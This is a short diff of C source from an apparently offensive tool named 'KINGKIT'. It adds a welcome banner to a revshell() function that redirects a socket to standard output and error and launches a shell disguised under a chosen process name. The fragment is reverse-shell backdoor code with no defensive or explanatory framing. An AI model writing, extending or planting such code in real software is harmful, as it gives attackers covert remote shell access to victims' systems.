@@ -257,6 +257,16 @@ void revshell() {
         dup2(sockfd, 1); //redirect standard output to the socket
         dup2(sockfd, 2); //redirect standard error to the socket
 
+        FILE *open_socket = fdopen(sockfd, "w");
+        fprintf(open_socket,
+        "******************************\n"
+        "KINGKIT REVERSE SHELL BACKDOOR\n"
+        "Welcome %s\n"
+        "******************************\n\n",
+        KING_NAME
+        );
+        fclose(open_socket);
+
         char *argv[] = {PROCESS_NAME, NULL}; //pass command-line arguments, the first argument appears as process name
         execve(SHELL, argv, NULL); //execute the shell
 
